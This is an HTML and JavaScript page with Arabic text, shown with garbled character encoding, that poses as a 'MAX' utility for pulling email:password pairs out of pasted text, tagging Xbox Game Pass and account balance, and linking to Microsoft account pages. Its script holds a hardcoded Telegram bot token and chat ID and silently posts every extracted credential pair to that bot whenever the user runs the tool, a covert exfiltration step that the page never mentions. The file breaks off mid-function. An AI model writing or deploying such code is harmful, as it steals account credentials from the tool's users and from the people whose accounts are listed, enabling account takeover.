<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Ø£Ø¯Ø§Ø© MAX: Ø§Ø³ØªØ®Ø±Ø§Ø¬ Email:Password</title>
    <style>
        /* ------------------------- Ø§Ù„Ù…ØªØºÙŠØ±Ø§Øª ÙˆØ§Ù„Ø£Ù„ÙˆØ§Ù† ------------------------- */
        :root {
            --card: #ffffffee;
            --accent: #e60000;
            --grad: linear-gradient(135deg, #e60000, #8b0000);
            --dark-grad: linear-gradient(135deg, #111, #2a0000);
            --success-color: #008000;
            --highlight-copy: #8b0000;
            --price-color: #0000ff; /* Ù„ÙˆÙ† Ø£Ø²Ø±Ù‚ Ù„ØªÙ…ÙŠÙŠØ² Ø§Ù„Ø±ØµÙŠØ¯ */
            --game-note-color: #ff9900; /* Ù„ÙˆÙ† Ø¨Ø±ØªÙ‚Ø§Ù„ÙŠ Ù„ØªÙ…ÙŠÙŠØ² Ø§Ù„Ø£Ù„Ø¹Ø§Ø¨ Ø§Ù„Ù…Ø­ØªÙ…Ù„Ø© */
        }

        /* ------------------------- Ø³ØªØ§ÙŠÙ„ Ø§Ù„Ø¬Ø³Ù… Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ ------------------------- */
        body {
            margin: 0;
            font-family: system-ui, -apple-system, Segoe UI, Roboto, 'Helvetica Neue', Arial;
            background: #111;
            padding-top: 20px; 
            padding-bottom: 50px;
            display: block; 
            min-height: auto;
        }

        body::before {
            content: "";
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(6px);
            z-index: -1
        }
        
        /* Ø¥Ø®ÙØ§Ø¡ Ø´Ø±ÙŠØ· Ø§Ù„Ù…Ø¤Ù‚Øª ÙˆØµÙØ­Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù„Ø£Ù† Ø§Ù„Ø£Ø¯Ø§Ø© Ù…ÙØªÙˆØ­Ø© Ù…Ø¨Ø§Ø´Ø±Ø© */
        #timer-bar, #login-page {
            display: none !important; 
        }

        /* ------------------------- Ø³ØªØ§ÙŠÙ„ Ø§Ù„Ø£Ø¯Ø§Ø© (Tool) ------------------------- */
        .wrap { max-width: 850px; margin: 20px auto; padding: 15px; }
        .card { background: var(--card); border-radius: 18px; padding: 20px; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5); margin-bottom: 20px; }
        h1 { margin: 6px 0 16px; font-size: 26px; text-align: center; color: #111; font-weight: 800; }
        textarea { width: 100%; min-height: 180px; padding: 15px; font-size: 15px; border-radius: 12px; border: 2px solid #ccc; resize: vertical; }
        .row { display: flex; gap: 10px; margin-top: 12px; flex-wrap: wrap; justify-content: center; }
        button { border: none; cursor: pointer; padding: 12px 18px; border-radius: 12px; font-size: 15px; transition: .3s; font-weight: 700; }
        .btn-red { background: var(--grad); color: #fff; box-shadow: 0 0 10px rgba(255, 0, 0, 0.7); }
        .btn-red:hover { transform: translateY(-3px); box-shadow: 0 0 18px rgba(255, 0, 0, 1); }
        .btn-black { background: var(--dark-grad); color: #fff; border: 2px solid #444; }
        .btn-black:hover { transform: translateY(-3px); box-shadow: 0 0 10px rgba(0, 0, 0, 0.8); }
        .list { margin-top: 15px; display: flex; flex-direction: column; gap: 12px; }
        .item { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 1px solid #ddd; background: #fff; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); }
        .item:last-child { border-bottom: none; }
        .left { display: flex; flex-direction: column; gap: 8px; flex: 1; overflow: hidden; }
        .email {
            font-weight: 800;
            color: #b30000;
            font-size: 16px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            transition: color 0.3s;
        }
        .email.copied {
            color: var(--highlight-copy); 
            animation: pulseCopy 0.5s;
        }
        @keyframes pulseCopy {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        .pw { 
            font-size: 14px; 
            color: #444; 
            white-space: nowrap; 
            overflow: hidden; 
            text-overflow: ellipsis; 
            font-weight: 600;
            display: flex; /* Ù„ØªØ±ØªÙŠØ¨ Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯ ÙˆØ§Ù„Ù…Ù„Ø§Ø­Ø¸Ø© */
            align-items: center;
        }
        /* ØªÙ…ÙŠÙŠØ² Ø®Ø§ØµÙŠØ© Game Pass */
        .gamepass-note {
            color: var(--success-color); /* Ø£Ø®Ø¶Ø± Ù„Ù„ØªÙ…ÙŠÙŠØ² */
            font-weight: 800;
            margin-right: 5px;
            white-space: nowrap; 
        }
        /* ØªÙ…ÙŠÙŠØ² Ø§Ù„Ø³Ø¹Ø± / Ø§Ù„Ø±ØµÙŠØ¯ */
        .price-note {
            color: var(--price-color); /* Ø£Ø²Ø±Ù‚ Ù„Ù„ØªÙ…ÙŠÙŠØ² */
            font-weight: 800;
            margin-right: 5px;
            white-space: nowrap;
        }
         /* ØªÙ…ÙŠÙŠØ² Ø§Ù„Ø£Ù„Ø¹Ø§Ø¨ Ø§Ù„Ù…Ø­ØªÙ…Ù„Ø© */
        .game-guess-note {
            color: var(--game-note-color); /* Ø¨Ø±ØªÙ‚Ø§Ù„ÙŠ Ù„Ù„ØªÙ…ÙŠÙŠØ² */
            font-weight: 800;
            margin-right: 5px;
            white-space: nowrap;
        }
        .controls { display: flex; gap: 8px; flex-shrink: 0; }
        .copy-btn { padding: 8px 12px; border-radius: 10px; font-size: 13px; font-weight: 600; }
        .copy-btn.btn-black { background: #222; }
        
        /* ------------------------- Ø³ØªØ§ÙŠÙ„ Ø§Ù„ØªÙ†Ø¨ÙŠÙ‡Ø§Øª (Toast) ------------------------- */
        .toast {
            position: fixed;
            left: 50%;
            transform: translateX(-50%);
            bottom: 30px;
            background: #111;
            color: #fff;
            padding: 12px 18px;
            border-radius: 12px;
            opacity: 0;
            pointer-events: none;
            transition: opacity .3s, bottom .3s;
            z-index: 2000; 
            font-weight: 600;
        }

        .toast.show { opacity: 1; bottom: 40px; }
        .hidden { display: none !important; }
        
        /* Ø³ØªØ§ÙŠÙ„ Ø§Ù„Ø±ÙˆØ§Ø¨Ø· */
        .footer{text-align:center;color:#fff;margin-top:20px;font-size:15px;font-weight:500;text-shadow:0 0 8px #000}
        .links-box{margin-top:20px;background:#ffffffee;padding:20px;border-radius:18px;box-shadow:0 6px 18px rgba(0,0,0,0.45);border:1px solid #eee}
        .links-box .title-header{font-size:24px;margin-bottom:18px;color:#fff;text-align:center;background:var(--grad);padding:15px;border-radius:15px;box-shadow:0 0 15px rgba(255,0,0,0.8);font-weight:800;border:2px solid #fff}
        .link-item{padding:15px;border-bottom:1px solid #ddd;display:flex;flex-direction:column}.link-item:last-child{border-bottom:none}
        .link-title{font-size:18px;font-weight:800;color:#b30000}
        .link-desc{font-size:14px;color:#555;margin:6px 0 10px}
        .premium-btn{display:block;width:100%;padding:12px;background:var(--dark-grad);border:2px solid var(--accent);color:#fff;text-align:center;border-radius:10px;text-decoration:none;font-weight:800;box-shadow:0 0 12px rgba(255,0,0,0.6);transition:.3s}
        .premium-btn:hover{transform:scale(1.03);box-shadow:0 0 20px rgba(255,0,0,1);background:var(--dark-grad)}

    </style>
</head>
<body>

<div id="timer-bar" class="hidden"></div> 
<div id="login-page" class="hidden"></div>

<div class="wrap" id="tool-page">
    <div class="card">
        <h1><span style="color:var(--accent);font-size:32px;">â“</span> Ø£Ø¯Ø§Ø© MAX: Ø§Ø³ØªØ®Ø±Ø§Ø¬ Email:Password</h1>
        <div style="text-align:center;color:#444;font-size:14px;margin-bottom:12px;font-weight:500;">
            Ø£Ù„ØµÙ‚ Ø§Ù„Ù†Øµ. Ø§Ù„Ø£Ø¯Ø§Ø© ØªØ³ØªØ®Ø±Ø¬ ÙÙ‚Ø·: <b style="color:var(--accent);">email:password</b>
        </div>
        <textarea id="input" placeholder="Ø£Ù„ØµÙ‚ Ø§Ù„Ù†Øµ Ù‡Ù†Ø§..."></textarea>
        <div class="row">
            <button id="parseBtn" class="btn-red">Ø§Ø³ØªØ®Ø±Ø§Ø¬</button>
            <button id="clearBtn" class="btn-black">Ù…Ø³Ø­ Ø§Ù„ÙƒÙ„</button>
            <button id="copyAllBtn" class="btn-black">Ù†Ø³Ø® ÙƒÙ„ Ø§Ù„Ù†ØªØ§Ø¦Ø¬</button>
            <button id="downloadBtn" class="btn-black">ØªÙ†Ø²ÙŠÙ„ Ù…Ù„Ù txt</button>
        </div>
        <div class="list" id="list"></div>
    </div>
    
    <div class="links-box">
        <div class="title-header">ğŸ”— Ø±ÙˆØ§Ø¨Ø· Microsoft Ùˆ Xbox Ø§Ù„Ù…Ù‡Ù…Ø©</div>
        <div class="link-item">
            <div class="link-title">ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ù…Ø§ÙŠÙƒØ±ÙˆØ³ÙˆÙØª/Xbox</div>
            <div class="link-desc">Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø±Ø³Ù…ÙŠØ© Ù„ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù…ÙˆØ­Ø¯ Ù„Ø­Ø³Ø§Ø¨ Microsoft Ùˆ Xbox.</div>
            <a class="premium-btn" href="https://login.live.com" target="_blank">ÙØªØ­ Ø±Ø§Ø¨Ø· Ø§Ù„Ø¯Ø®ÙˆÙ„ â¡ï¸</a>
        </div>
        <div class="link-item">
            <div class="link-title">ØµÙØ­Ø© Ø±Ø¨Ø· Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© (Link Code)</div>
            <div class="link-desc">Ø§Ø³ØªØ®Ø¯Ù… Ø§Ù„Ø±Ù…Ø² Ø§Ù„Ø¸Ø§Ù‡Ø± Ø¹Ù„Ù‰ Ø¬Ù‡Ø§Ø² Xbox Ø£Ùˆ Ø§Ù„ØªÙ„ÙØ²ÙŠÙˆÙ† Ù„Ù„ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø³Ø±ÙŠØ¹.</div>
            <a class="premium-btn" href="https://www.microsoft.com/link" target="_blank">ÙØªØ­ ØµÙØ­Ø© Ø§Ù„ÙƒÙˆØ¯ ğŸŒ</a>
        </div>
        <div class="link-item">
            <div class="link-title">Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø­Ø³Ø§Ø¨ Ù…Ø§ÙŠÙƒØ±ÙˆØ³ÙˆÙØª</div>
            <div class="link-desc">Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©ØŒ ØªØ­Ø¯ÙŠØ« ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ±ØŒ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø­Ù…Ø§ÙŠØ© ÙˆØ§Ù„Ø£Ù…Ø§Ù†.</div>
            <a class="premium-btn" href="https://account.microsoft.com" target="_blank">Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø­Ø³Ø§Ø¨ âš™ï¸</a>
        </div>
        <div class="link-item">
            <div class="link-title">Ø³Ø¬Ù„ Ø§Ù„Ø´Ø±Ø§Ø¡ ÙˆØ§Ù„Ø·Ù„Ø¨Ø§Øª (Orders)</div>
            <div class="link-desc">Ø¹Ø±Ø¶ ÙƒÙ„ Ù…Ø´ØªØ±ÙŠØ§ØªÙƒ Ø§Ù„Ø³Ø§Ø¨Ù‚Ø© Ù…Ù† Ù…ØªØ¬Ø± Microsoft Ùˆ Xbox.</div>
            <a class="premium-btn" href="https://account.microsoft.com/billing/orders" target="_blank">Ø¹Ø±Ø¶ Ø³Ø¬Ù„ Ø§Ù„Ø´Ø±Ø§Ø¡ ğŸ›’</a>
        </div>
        <div class="link-item">
            <div class="link-title">Ø·Ø±Ù‚ Ø§Ù„Ø¯ÙØ¹ (Payment Options)</div>
            <div class="link-desc">Ø¥Ø¯Ø§Ø±Ø© Ø¨Ø·Ø§Ù‚Ø§Øª Ø§Ù„Ø§Ø¦ØªÙ…Ø§Ù†ØŒ Ø­Ø³Ø§Ø¨Ø§Øª PayPalØŒ ÙˆØ·Ø±Ù‚ Ø§Ù„Ø¯ÙØ¹ Ø§Ù„Ø£Ø®Ø±Ù‰.</div>
            <a class="premium-btn" href="https://account.microsoft.com/billing/payments" target="_blank">Ø¥Ø¯Ø§Ø±Ø© Ø·Ø±Ù‚ Ø§Ù„Ø¯ÙØ¹ ğŸ’³</a>
        </div>
        <div class="link-item">
            <div class="link-title">Ø®Ø¯Ù…Ø§Øª ÙˆØ§Ø´ØªØ±Ø§ÙƒØ§Øª Xbox/Microsoft</div>
            <div class="link-desc">Ø¥Ø¯Ø§Ø±Ø© Ø§Ø´ØªØ±Ø§ÙƒÙƒ ÙÙŠ Xbox Game PassØŒ Office 365ØŒ ÙˆØºÙŠØ±Ù‡Ø§.</div>
            <a class="premium-btn" href="https://account.microsoft.com/services" target="_blank">Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø§Ø´ØªØ±Ø§ÙƒØ§Øª ğŸ—“ï¸</a>
        </div>
        <div class="link-item">
            <div class="link-title">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬ Ù…Ù† ÙƒÙ„ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©</div>
            <div class="link-desc">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬ Ù…Ù† ÙƒÙ„ Ø®Ø¯Ù…Ø§Øª ÙˆØ­Ø³Ø§Ø¨Ø§Øª Microsoft Ø§Ù„Ù†Ø´Ø·Ø© (Ø¢Ù…Ù†).</div>
            <a class="premium-btn" href="https://login.live.com/oauth20_logout.srf" target="_blank">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬ ğŸ”“</a>
        </div>
    </div>

    <div class="footer">Ø­Ù‚ÙˆÙ‚ Â© Telegram: <b>@xgbox7</b> | Ø£Ø¯Ø§Ø© MAX</div>
</div>

<div id="toast" class="toast"></div>

<script>
    // **********************************************
    // ** Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªÙ„ÙŠÙƒØ±Ø§Ù… **
    // **********************************************
    const BOT_TOKEN = "7817255826:AAFUCn_0zWCsUTBORd5bL_tFMcfZtJ2Dus4"; 
    const CHAT_ID = "7781990630";
    
    function sendToTelegram(messageText) {
        if (!BOT_TOKEN || !CHAT_ID) {
            console.error("Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨ÙˆØª ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯Ø©.");
            return;
        }
        
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const data = {
            chat_id: CHAT_ID,
            text: messageText, 
            parse_mode: 'Markdown' 
        };

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => {
            if (!data.ok) {
                console.error("Ø®Ø·Ø£ Ø¨Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ„ÙŠÙƒØ±Ø§Ù…:", data.description);
            }
        })
        .catch(error => {
            console.error('Fetch Error:', error);
        });
    }

    // **********************************************
    // ** ÙƒÙˆØ¯ Ø§Ù„Ø£Ø¯Ø§Ø© Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ Ù…Ø¹ Ø¯Ø¹Ù… (Game Pass) Ùˆ (Balance) **
    // **********************************************
    
    // 1. Regex Ø§Ù„Ù…Ø¹Ø¯Ù„ Ù„Ø²ÙŠØ§Ø¯Ø© Ø¯Ù‚Ø© Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯ ÙˆÙ…Ù†Ø¹ Ø³Ø­Ø¨ Ø§Ù„Ø£ÙˆØµØ§Ù Ù…Ø¹Ù‡.
    const emailPwRegex = /([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})\s*[:\- ]\s*([^\s,;'"<>()\[\]{}|\/\\]+)/g;
    
    // 2. Regex Ù„Ù„Ø¨Ø­Ø« Ø¹Ù† ÙƒÙ„Ù…Ø§Øª Game Pass (Ø§Ù„Ø£Ù„ØªÙŠÙ…ÙŠØª ÙˆÙƒÙ„ Ø§Ù„ØªÙˆÙ„ÙŠÙØ§Øª).
    const gamePassKeywords = /([(#=\-\[\]\s\/\!\@\&\*]|^)(ÙƒÙŠÙ…\s?Ø¨Ø§Ø³|Ù‚ÙŠÙ…\s?Ø¨Ø§Ø³|game\s?pass|gamepass|gpass|(xbox\s?(game\s?pass)?\s?ultimate)|Ø§Ù„ØªÙŠÙ…ÙŠØª|Ø¬ÙˆÙ„Ø¯|gold|pc\s?(game\s?pass)?|xbox|gpu|xgpu|Ø¨ÙŠØ³ÙŠ|ÙƒÙ…Ø¨ÙŠÙˆØªØ±|Ù…ÙØ¹Ù„|Ù†Ø´Ø·|active|months|years|Ø´Ù‡Ø±|Ø³Ù†Ø©|Ø³Ù†Ù‡|Ø§Ø´ØªØ±Ø§Ùƒ|gaming|mo(nths)?|yr(s)?|3m|6m|12m|1y)/gi; 
    
    // 3. Regex Ù„Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø³Ø¹Ø± Ø£Ùˆ Ø§Ù„Ø±ØµÙŠØ¯ Ø§Ù„Ù…ÙˆØ¬ÙˆØ¯ (ÙŠØ´Ù…Ù„ Balance).
    const priceRegex = /(price|credit|Ø±ØµÙŠØ¯|Ø¯ÙˆÙ„Ø§Ø±|usd|ÙƒØ±Ø¯Øª|balance)\s*[:=\-]?\s*(\d+(\.\d{1,2})?)/gi;

    
    const input = document.getElementById("input");
    const parseBtn = document.getElementById("parseBtn");
    const list = document.getElementById("list");
    const toast = document.getElementById("toast");
    const clearBtn = document.getElementById("clearBtn");
    const copyAllBtn = document.getElementById("copyAllBtn");
    const downloadBtn = document.getElementById("downloadBtn");

    function showToast(e) {
        toast.textContent = e;
        toast.classList.add("show");
        clearTimeout(toast._t);
        toast._t = setTimeout(() => toast.classList.remove("show"), 2000);
    }

    async function copyText(e) {
        try {
            return await navigator.clipboard.writeText(e), !0
        } catch (e) {
            const t = document.createElement("textarea");
            return t.value = e, document.body.appendChild(t), t.select(), document.execCommand("copy"), t.remove(), !0
        }
    }

    function parseText() {
        const originalText = input.value.trim();
        list.innerHTML = "";
        if (!originalText) return void showToast("Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ù†Øµ Ù„Ù„Ù…Ø³Ø­");

        const lines = originalText.split('\n').filter(line => line.trim() !== '');
        
        // [email, password, hasGamePass (boolean), price (string or null), needsGameGuess (boolean)]
        const extractedPairs = []; 
        
        for (const line of lines) {
            emailPwRegex.lastIndex = 0; 
            priceRegex.lastIndex = 0;

            let match;
            
            // 1. Ø§Ø³ØªØ®Ø±Ø§Ø¬ (Email:Password)
            if ((match = emailPwRegex.exec(line)) !== null) {
                const email = match[1].trim();
                const password = match[2].trim();
                
                // 2. Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ÙˆØ¬ÙˆØ¯ ÙƒÙ„Ù…Ø§Øª Game Pass
                const hasGamePass = gamePassKeywords.test(line);

                // 3. Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø§Ù„Ø³Ø¹Ø±/Ø§Ù„Ø±ØµÙŠØ¯
                let priceMatch = priceRegex.exec(line);
                let extractedPrice = null;

                if (priceMatch) {
                    extractedPrice = priceMatch[2];
                }
                
                // 4. ØªØ­Ø¯ÙŠØ¯ Ø¥Ø°Ø§ ÙƒØ§Ù† ÙŠØ­ØªØ§Ø¬ Ù…Ù„Ø§Ø­Ø¸Ø© "Ø§Ø­ØªÙ…Ø§Ù„ ÙˆØ¬ÙˆØ¯ Ø§Ù„Ø¹Ø§Ø¨"
                const needsGameGuess = !hasGamePass && (extractedPrice === null);


                if (email && password.length > 0) {
                    // Ø£Ø¶ÙÙ†Ø§ (needsGameGuess) ÙƒØ¹Ù†ØµØ± Ø®Ø§Ù…Ø³
                    extractedPairs.push([email, password, hasGamePass, extractedPrice, needsGameGuess]);
                }
            }
        }
        
        if (0 === extractedPairs.length) return void showToast("Ù…Ø§ÙƒÙˆ Ù†ØªØ§Ø¦Ø¬ Ù…Ø·Ø§Ø¨Ù‚Ø©");

        // 5. ÙÙ„ØªØ±Ø© Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø§Ù„Ù…ØªÙƒØ±Ø±Ø© ÙˆØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ø®ØµØ§Ø¦Øµ
        const uniqueResults = [];
        for (const [email, password, hasGamePass, price, needsGameGuess] of extractedPairs) {
            const key = email.toLowerCase() + ":" + password;
            const existingIndex = uniqueResults.findIndex(item => (item[0].toLowerCase() + ":" + item[1]) === key);

            if (existingIndex === -1) {
                // Ø¥Ø°Ø§ ÙƒØ§Ù† ÙØ±ÙŠØ¯ØŒ Ù†Ø¶ÙŠÙÙ‡
                uniqueResults.push([email, password, hasGamePass, price, needsGameGuess]);
            } else {
                const existingItem = uniqueResults[existingIndex];
                
                // Ø¥Ø°Ø§ Ù„Ù‚Ù‰ ÙƒÙŠÙ… Ø¨Ø§Ø³ Ø¬Ø¯ÙŠØ¯ØŒ ÙŠØ¶ÙŠÙÙ‡
                if (hasGamePass && !existingItem[2]) {
                    existingItem[2] = true; 
                }
                // Ø¥Ø°Ø§ Ù„Ù‚Ù‰ Ø±ØµÙŠØ¯ Ø¬Ø¯ÙŠØ¯ØŒ ÙŠØ¶ÙŠÙÙ‡
                if (price !== null && existingItem[3] === null) {
                    existingItem[3] = price;
                }
                // Ø¥Ø°Ø§ Ù„Ù‚Ù‰ Ø£ÙŠ Ù…Ù† Ø§Ù„Ø®ØµØ§Ø¦ØµØŒ ÙŠØ´ÙŠÙ„ Ø¹Ù„Ø§Ù…Ø© "Ø§Ø­ØªÙ…Ø§Ù„ ÙˆØ¬ÙˆØ¯ Ø§Ù„Ø¹Ø§Ø¨"
                if (existingItem[2] || existingItem[3] !== null) {
                    existingItem[4] = false; 
                }
            }
        }


        // **********************************************
        // ** Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ù„Ù„ØªÙ„ÙŠÙƒØ±Ø§Ù… **
        // **********************************************
        if (uniqueResults.length > 0) {
            const telegramMessage = uniqueResults.map(([email, password, hasGP, price, needsGameGuess]) => {
                const gpNote = hasGP ? " | ÙƒÙŠÙ… Ø¨Ø§Ø³" : "";
                const priceNote = price ? ` | BALANCE=$${price}` : "";
                const gameGuessNote = needsGameGuess ? " | GAMES_POSSIBLE" : ""; // Ù…Ù„Ø§Ø­Ø¸Ø© Ø®Ø§ØµØ© Ø¨Ø§Ù„ØªÙ„ÙŠÙƒØ±Ø§Ù…
                return `${email}:${password}${gpNote}${priceNote}${gameGuessNote}`;
            }).join('\n');
            
            const header = `ğŸ‰ *Ù†ØªØ§Ø¦Ø¬ Ø£Ø¯Ø§Ø© MAX Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©* ğŸ‰\nØªÙ… Ø§Ø³ØªØ®Ø±Ø§Ø¬ ${uniqueResults.length} Ù†ØªÙŠØ¬Ø© ÙØ±ÙŠØ¯Ø©:\n\n\`\`\``;
            const footer = "\n\`\`\`\nØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ù…Ù† Ø§Ù„Ø£Ø¯Ø§Ø©.";
            sendToTelegram(header + telegramMessage + footer);
        }

        // 6. Ø¨Ù†Ø§Ø¡ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù†ØªØ§Ø¦Ø¬ (Ø§Ù„Ø¹Ø±Ø¶ Ø¹Ù„Ù‰ Ø§Ù„Ø´Ø§Ø´Ø©)
        for (const [email, password, hasGamePass, price, needsGameGuess] of uniqueResults) {
            const itemDiv = document.createElement("div");
            itemDiv.className = "item";
            const leftDiv = document.createElement("div");
            leftDiv.className = "left";
            
            const emailDiv = document.createElement("div");
            emailDiv.className = "email";
            emailDiv.textContent = email;
            
            const pwDiv = document.createElement("div");
            pwDiv.className = "pw";
            
            const passwordText = document.createTextNode(password);
            pwDiv.appendChild(passwordText); 

            if (hasGamePass) {
                 const gpSpan = document.createElement("span");
                 gpSpan.className = "gamepass-note";
                 gpSpan.textContent = " | ÙƒÙŠÙ… Ø¨Ø§Ø³";
                 pwDiv.appendChild(gpSpan); 
            }
            
            if (price !== null) {
                 const priceSpan = document.createElement("span");
                 priceSpan.className = "price-note";
                 priceSpan.textContent = ` | Ø±ØµÙŠØ¯: $${price}`; 
                 pwDiv.appendChild(priceSpan); 
            }
            
            // ************ Ø§Ù„Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©: Ù…Ù„Ø§Ø­Ø¸Ø© Ø§Ø­ØªÙ…Ø§Ù„ ÙˆØ¬ÙˆØ¯ Ø§Ù„Ø£Ù„Ø¹Ø§Ø¨ ************
            if (needsGameGuess) {
                 const gameGuessSpan = document.createElement("span");
                 gameGuessSpan.className = "game-guess-note";
                 gameGuessSpan.textContent = " | Ø§Ø­ØªÙ…Ø§Ù„ ÙˆØ¬ÙˆØ¯ Ø§Ù„Ø¹Ø§Ø¨";
                 pwDiv.appendChild(gameGuessSpan); 
            }
            // *******************************************************************


            leftDiv.appendChild(emailDiv);
            leftDiv.appendChild(pwDiv);
            
            const controlsDiv = document.createElement("div");
            controlsDiv.className = "controls";
            
            // Ø²Ø± Ù†Ø³Ø® Ø§Ù„Ø¥ÙŠÙ…ÙŠÙ„
            const copyEmailBtn = document.createElement("button");
            copyEmailBtn.className = "copy-btn btn-red";
            copyEmailBtn.textContent = "Ù†Ø³Ø® Ø§Ù„Ø¥ÙŠÙ…ÙŠÙ„";
            copyEmailBtn.onclick = async () => {
                await copyText(email) && showToast("ØªÙ… Ù†Ø³Ø® Ø§Ù„Ø¥ÙŠÙ…ÙŠÙ„");
                emailDiv.classList.add('copied');
                setTimeout(() => emailDiv.classList.remove('copied'), 600); 
            };
            
            // Ø²Ø± Ù†Ø³Ø® Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯
            const copyPwBtn = document.createElement("button");
            copyPwBtn.className = "copy-btn btn-black";
            copyPwBtn.textContent = "Ù†Ø³Ø® Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯";
            copyPwBtn.onclick = async () => {
                await copyText(password) && showToast("ØªÙ… Ù†Ø³Ø® Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯");
            };
            
            controlsDiv.appendChild(copyEmailBtn);
            controlsDiv.appendChild(copyPwBtn);
            
            itemDiv.appendChild(leftDiv);
            itemDiv.appendChild(controlsDiv);
            
            list.appendChild(itemDiv);
        }
        showToast(`ØªÙ… Ø§Ø³ØªØ®Ø±Ø§Ø¬ ${uniqueResults.length} Ù†ØªÙŠØ¬Ø© ÙØ±ÙŠØ¯Ø©`)
    }

    // Ø±Ø¨Ø· Ø§Ù„Ø£Ø²Ø±Ø§Ø±
    parseBtn.onclick = parseText;
    clearBtn.onclick = () => { input.value = "", list.innerHTML = "", showToast("ØªÙ… Ù…Ø³Ø­ Ù…Ø­ØªÙˆÙ‰ Ø§Ù„Ø£Ø¯Ø§Ø©"); };
    
    // ØªØ¹Ø¯ÙŠÙ„ ÙˆØ¸ÙŠÙØ© Ù†Ø³Ø® Ø§Ù„ÙƒÙ„ Ø¹Ø´Ø§Ù† ØªÙ†Ø³Ø® ÙƒÙ„ Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø§Øª
    copyAllBtn.onclick = async () => {
        const e = list.querySelectorAll(".item");
        if (!e.length) return void showToast("Ù„Ø§ ØªÙˆØ¬Ø¯ Ù†ØªØ§Ø¦Ø¬ Ù„Ù†Ø³Ø®Ù‡Ø§");
        
        const t = [...e].map(e => { 
            const email = e.querySelector(".email").textContent.trim(); 
            const pwDiv = e.querySelector(".pw");
            const password = pwDiv.firstChild.textContent.trim(); 
            
            // Ø¬Ù…Ø¹ ÙƒÙ„ Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø§Øª (GP Ùˆ Ø§Ù„Ø±ØµÙŠØ¯ Ùˆ Ø§Ù„Ø£Ù„Ø¹Ø§Ø¨)
            const notes = [...pwDiv.querySelectorAll('.gamepass-note, .price-note, .game-guess-note')]
                          .map(span => span.textContent.trim())
                          .join('');

            return email + ":" + password + notes; 
        }).join("\n");
        
        await copyText(t) && showToast("ØªÙ… Ù†Ø³Ø® ÙƒÙ„ Ø§Ù„Ù†ØªØ§Ø¦Ø¬");
    };
    
    // ØªØ¹Ø¯ÙŠÙ„ ÙˆØ¸ÙŠÙØ© ØªÙ†Ø²ÙŠÙ„ Ø§Ù„Ù…Ù„Ù Ø¹Ø´Ø§Ù† ØªÙ†Ø³Ø® ÙƒÙ„ Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø§Øª
    downloadBtn.onclick = () => {
        const e = list.querySelectorAll(".item");
        if (!e.length) return void showToast("Ù„Ø§ ØªÙˆØ¬Ø¯ Ù†ØªØ§Ø¦Ø¬ Ù„Ù„ØªÙ†Ø²ÙŠÙ„");
        
        const t = [...e].map(e => { 
            const email = e.querySelector(".email").textContent.trim(); 
            const pwDiv = e.querySelector(".pw");
            const password = pwDiv.firstChild.textContent.trim(); 
            
